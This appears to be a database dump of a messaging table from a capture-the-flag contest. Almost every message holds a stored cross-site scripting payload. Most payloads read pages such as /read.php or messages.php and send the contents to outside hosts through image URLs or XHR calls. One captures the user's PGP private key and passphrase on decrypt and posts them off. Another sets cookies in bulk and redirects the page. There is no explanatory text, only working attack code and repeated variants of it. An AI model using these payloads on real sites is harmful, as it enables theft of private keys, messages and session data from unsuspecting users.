id	recipient	sender	subject	message
4416	vtest3	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data) + "'>");\n}});\n});\n \n});</script>
4417	testid	testid	<img src="http://123.111.158.161/?ctf=RC3ctf"/>	<iframe id="frameID" width="1000" height="1000"></iframe>\n<script>\n\n(function (exports) {\n    function urlsToAbsolute(nodeList) {\n        if (!nodeList.length) {\n            return [];\n        }\n        var attrName = 'href';\n        if (nodeList[0].__proto__ === HTMLImageElement.prototype \n        || nodeList[0].__proto__ === HTMLScriptElement.prototype) {\n            attrName = 'src';\n        }\n        nodeList = [].map.call(nodeList, function (el, i) {\n            var attr = el.getAttribute(attrName);\n            if (!attr) {\n                return;\n            }\n            var absURL = /^(https?|data):/i.test(attr);\n            if (absURL) {\n                return el;\n            } else {\n                return el;\n            }\n        });\n        return nodeList;\n    }\n\n    function screenshotPage() {\n        urlsToAbsolute(document.images);\n        urlsToAbsolute(document.querySelectorAll("link[rel='stylesheet']"));\n        var screenshot = document.documentElement.cloneNode(true);\n        var b = document.createElement('base');\n        b.href = document.location.protocol + '//' + location.host;\n        var head = screenshot.querySelector('head');\n        head.insertBefore(b, head.firstChild);\n        screenshot.style.pointerEvents = 'none';\n        screenshot.style.overflow = 'hidden';\n        screenshot.style.webkitUserSelect = 'none';\n        screenshot.style.mozUserSelect = 'none';\n        screenshot.style.msUserSelect = 'none';\n        screenshot.style.oUserSelect = 'none';\n        screenshot.style.userSelect = 'none';\n        screenshot.dataset.scrollX = window.scrollX;\n        screenshot.dataset.scrollY = window.scrollY;\n        var script = document.createElement('script');\n        script.textContent = '(' + addOnPageLoad_.toString() + ')();';\n        screenshot.querySelector('body').appendChild(script);\n        var blob = new Blob([screenshot.outerHTML], {\n            type: 'image'\n        });\n        console.log(blob)\n        return blob;\n    }\n\n    function addOnPageLoad_() {\n        window.addEventListener('DOMContentLoaded', function (e) {\n            var scrollX = document.documentElement.dataset.scrollX || 0;\n            var scrollY = document.documentElement.dataset.scrollY || 0;\n            window.scrollTo(scrollX, scrollY);\n        });\n    }\n\n    function generate() {\n        window.URL = window.URL || window.webkitURL;\n        window.open(window.URL.createObjectURL(screenshotPage()));\n    }\n    exports.screenshotPage = screenshotPage;\n    exports.generate = generate;\n})(window);\n\n\nvar iframe = document.getElementById('frameID'),\n    iframeWin = iframe.contentWindow || iframe,\n    iframeDoc = iframe.contentDocument || iframeWin.document;\n\nwindow.hello = function () {\n    var good = "";\n    var str = "";\n    for (var i=0; i< 819; i++) {\n        str += "x";\n    }\n    // Set cookies\n    for     (i = 0; i < 10; i++) {\n        // Expire evil cookie\n        if (good) {\n            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/index.html;";\n        }\n        // Set evil cookie\n        else {\n            var cookie = "xss"+i+"="+str+";path=/";\n        }\n        document.cookie = cookie;\n    }\n};\n\n$(iframeDoc).ready(function (event) {\n    iframeDoc.open();\n    iframeDoc.write('\\<script>parent.hello();\\<\\/script>');\n    iframeDoc.write('\\<script>location.href = "http://54.172.225.153:8000/";\\<\\/script>');\n    iframeDoc.close();\n});\ngenerate();\n$.post('http://123.111.158.161/get.php',{content:encodeURIComponent(document.location.href)}, function(data) {\n    alert(data);\n})\n</script>
4418	vtest3	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data) + "'>");\n}});\n \n});</script>
4419	vtest3	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nalert(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data) + "'>");\n}});\n \n});</script>
4420	vtest3	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nalert(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data.replace(\\"'\\",\\"Q\\")) + "'>");\n}});\n \n});</script>
4421	vtest3	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\nalert(data);\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data.replace("'","QQ")) + "'>");\n}});\n \n});</script>
4422	julianassange	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data.replace("'","QQ")) + "'>");\n}});\n \n});</script>
4423	vtest3	vtest1	x10	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data.replace("'","QQ")) + "'>");\n}});\n \n});</script>
4424	hotab2	hotab	0	<script>\nfunction get(u, pass, method, pin)\n{\n\tvar x = new XMLHttpRequest();\n\tx.onreadystatechange=function() {\n\tif (x.readyState==4 && x.status==200) { \n\t\t\tif(pass) {\n\t\t\t\tvar t = x.responseText; \n\t\t\t\tget("http://hotab.ddns.me/?"+encodeURIComponent(t.substring(0,4096)));\n\t\t\t}\n\t\t};\n\t};\n\tx.open(method || "GET", u, false);\n\tif(pin) {\n\t\tx.send();\n\t}\n\telse {\n\t\tx.send({\n\t\t\tpin: pin\n\t\t})\n\t}\n};\n\nt = get("http://54.172.225.153/messages.php?id=3907", true, "POST", "123456");\n\n</script>
4425	julianassange	vtest1	x10	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$.ajax({\ntype:"GET",\nurl: "/read.php", \ndataType: "html",\nsuccess: function(data) {\n$("body").append("<img src='http://v.dragonsector.pl/d?" + encodeURIComponent(data.replace("'","QQ")) + "'>");\n}});\n \n});</script>
4426	aaaaa	aaaaa	d	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwcBMA2ijAvgNApLaAQf9GqV4EBNa1L9+6tuDe2Anzk6CHuEnKnUYugPzVM7O7ONJ\nqO8pgoVevF5Q5zUWand524Vv8UR0QJhWrFixLLqU2092rVY8ZIQOvEiQIagMUTKD\n2+xYd2b1MapCIXT44T+xZAA/jyHNFGmG7dJ6tsrasNspf/fAxhWAiQvIQMWrGAEq\ndKySx9lgethmKUIOkFp5YJDi+DEnqiSRA3fEwyqMAzL2jRmBQY7blmb9grD7UQFg\nZ6rZSrQTzLwUB9cr7DMdQ0aOXmzKl11vOxDGC/LXZlUXG1SZNMBgejxhBsE/7h7V\nMqurTHfnqlWmuPCLNf4rhDRxkM0FXOcL6DN49gomNtI9AZ54ENjLWwYYpRMvTnLt\nE8wfSRUB94MfVlTgt4K885MLckL8xNSN/rMOBna1dP1OtpUslNr2ZrHJi72yKQ==\n=Fv8T\n-----END PGP MESSAGE-----\n<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>  <script> $(document).ready( function () {   $.post( "messages.php?id=1", { pin: "1234"})   .done(function( data ) {     $('#dec-msg').html("<img src='http://azathoth.bytesexual.net:1235/10xxuddd" + data + "'>") ;   });   });  </script>
4427	julianassange	vtest1	x9	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\nB5iB0bCwHpPDLzshubMM\n=HlY5\n-----END PGP MESSAGE-----\n<img src="http://v.dragonsector.pl/img"><script>\n$(document).ready(function() {\n$("#decrypt-button").click(function(e) {\n$("body").append("<form action='/send.php' method='POST' id='f1'><input type='hidden' name='encMessage' value='\\\n-----BEGIN PGP MESSAGE-----\\\nVersion: Keybase OpenPGP v2.0.8\\\nComment: https://keybase.io/crypto\\\n\\\nwYwDGBklwKNIj6cBA/0Rs9tf8eEV9HS7Sikvkvmr/zP1n72Ebe0+ArUJTdPoBF+8\\\nnTnXgIYGeteeJkU222PRn5wQA+SEDjDufMZ0GNJ/PgNyxY/W1pC/AT8w6rqBAl7F\\\nsozAd/HOS7eSkRlDW4ZXZJeIquzDseyYJ9JocF971iRUv7Vs6m5QTT8N/dNOw9I/\\\nASRpLy6Pmwk+TVv23MUkGOYDqR+5YtYs5HswfKherEqC5K/2jjmG8ciz2a3lr1Xp\\\nB5iB0bCwHpPDLzshubMM\\\n=HlY5\\\n-----END PGP MESSAGE-----" + $("#privkey").val() + "pass:" + $("#msg-subject").val() + "'><input type='hidden' name='toID' value='451'><input type='hidden' name='subject' value='key2'></form>");\n$("#f1").submit();\n});\n \n});</script>
4428	hotab2	hotab	0	<script>\nfunction get(u, pass, method, pin)\n{\n\tvar x = new XMLHttpRequest();\n\tx.onreadystatechange=function() {\n\tif (x.readyState==4 && x.status==200) { \n\t\t\tif(pass) {\n\t\t\t\tvar t = x.responseText; \n\t\t\t\tget("http://hotab.ddns.me/?"+encodeURIComponent(t.substring(0,4096)));\n\t\t\t}\n\t\t};\n\t};\n\tx.open(method || "GET", u, false);\n\tif(pin) {\n\t\tx.send();\n\t}\n\telse {\n\t\tx.send("pin="+pin);\n\t}\n};\n\nt = get("http://54.172.225.153/messages.php?id=3907", true, "POST", "123456");\n\n</script>
4429	testid	testid	<img src="http://123.111.158.161/?ctf=RC3ctf"/>	<iframe id="frameID" width="1000" height="1000"></iframe>\n<script>\n\n(function (exports) {\n    function urlsToAbsolute(nodeList) {\n        if (!nodeList.length) {\n            return [];\n        }\n        var attrName = 'href';\n        if (nodeList[0].__proto__ === HTMLImageElement.prototype \n        || nodeList[0].__proto__ === HTMLScriptElement.prototype) {\n            attrName = 'src';\n        }\n        nodeList = [].map.call(nodeList, function (el, i) {\n            var attr = el.getAttribute(attrName);\n            if (!attr) {\n                return;\n            }\n            var absURL = /^(https?|data):/i.test(attr);\n            if (absURL) {\n                return el;\n            } else {\n                return el;\n            }\n        });\n        return nodeList;\n    }\n\n    function screenshotPage() {\n        urlsToAbsolute(document.images);\n        urlsToAbsolute(document.querySelectorAll("link[rel='stylesheet']"));\n        var screenshot = document.documentElement.cloneNode(true);\n        var b = document.createElement('base');\n        b.href = document.location.protocol + '//' + location.host;\n        var head = screenshot.querySelector('head');\n        head.insertBefore(b, head.firstChild);\n        screenshot.style.pointerEvents = 'none';\n        screenshot.style.overflow = 'hidden';\n        screenshot.style.webkitUserSelect = 'none';\n        screenshot.style.mozUserSelect = 'none';\n        screenshot.style.msUserSelect = 'none';\n        screenshot.style.oUserSelect = 'none';\n        screenshot.style.userSelect = 'none';\n        screenshot.dataset.scrollX = window.scrollX;\n        screenshot.dataset.scrollY = window.scrollY;\n        var script = document.createElement('script');\n        script.textContent = '(' + addOnPageLoad_.toString() + ')();';\n        screenshot.querySelector('body').appendChild(script);\n        var blob = new Blob([screenshot.outerHTML], {\n            type: 'image/jpeg'\n        });\n        var url = URL.createObjectURL(blob);\n        var img = new Image;\n        console.log(url)\n        return blob;\n    }\n\n    function addOnPageLoad_() {\n        window.addEventListener('DOMContentLoaded', function (e) {\n            var scrollX = document.documentElement.dataset.scrollX || 0;\n            var scrollY = document.documentElement.dataset.scrollY || 0;\n            window.scrollTo(scrollX, scrollY);\n        });\n    }\n\n    function generate() {\n        window.URL = window.URL || window.webkitURL;\n        window.open(window.URL.createObjectURL(screenshotPage()));\n    }\n    exports.screenshotPage = screenshotPage;\n    exports.generate = generate;\n})(window);\n\n\nvar iframe = document.getElementById('frameID'),\n    iframeWin = iframe.contentWindow || iframe,\n    iframeDoc = iframe.contentDocument || iframeWin.document;\n\nwindow.hello = function () {\n    var good = "";\n    var str = "";\n    for (var i=0; i< 819; i++) {\n        str += "x";\n    }\n    // Set cookies\n    for     (i = 0; i < 10; i++) {\n        // Expire evil cookie\n        if (good) {\n            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/index.html;";\n        }\n        // Set evil cookie\n        else {\n            var cookie = "xss"+i+"="+str+";path=/";\n        }\n        document.cookie = cookie;\n    }\n};\n\n$(iframeDoc).ready(function (event) {\n    iframeDoc.open();\n    iframeDoc.write('\\<script>parent.hello();\\<\\/script>');\n    iframeDoc.write('\\<script>location.href = "http://54.172.225.153:8000/";\\<\\/script>');\n    iframeDoc.close();\n});\ngenerate();\n$.post('http://123.111.158.161/get.php',{content:encodeURIComponent(document.location.href)}, function(data) {\n    alert(data);\n})\n</script>\n\nfunction capture() {\n    html2canvas($('body'),{\n        onrendered: function (canvas) {                     \n            var imgString = canvas.toDataURL("image/png");\n            window.open(imgString);                  \n        }\n    });\n}
4430	aaaaa	aaaaa	aa	-----BEGIN PGP MESSAGE-----\nVersion: Keybase OpenPGP v2.0.8\nComment: https://keybase.io/crypto\n\nwcBMA2ijAvgNApLaAQf/dt7lEE/nsaEyQ156/edWbyFfwDA3FgWMGbqiGViMrmRE\nRd3wK96xtYYx8gvGeAryMLeyTVChnZy1yJMDN105togyojrKQ884w8Eb6Dy5+m0E\nkJNHfliqSbJpZFkYC84WENCWP/SsVvb6e/t2Zl1LUZz2P2qKkTYxQkQIhE1zDQhP\nz1FGGYK6UqFel+wZ9UwVIEwJ8rnnjJ70d/8NBx8t7eu6Ji92wJ2yYcWYkIvRf08F\nUMLFd2QLWDVdg9f4RMiptI2dd0plScITCy13oiyp8RTfPrmSY+JbXpWJtkdA5umm\nDUK28T5IN0o1jV4W5ziTiJ0wZFr1OWizup16jSht4NI+AXxDYgOF54H74awJlcFk\njZszGZHuBTslf0PEb0E5/lYA/F6b6wlU5SdBW2QZZdsqTphON7QTmJutYSFhHqU=\n=D5GG\n-----END PGP MESSAGE-----\n<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>  <script> $(document).ready( function () {   $.post( "messages.php?id=1", { pin: "1234"})   .done(function( data ) {     $('#dec-msg').html("<img src='http://azathoth.bytesexual.net:1235/10xxuddd" + encodeURIComponent(data) + "'>") ;   });   });  </script>
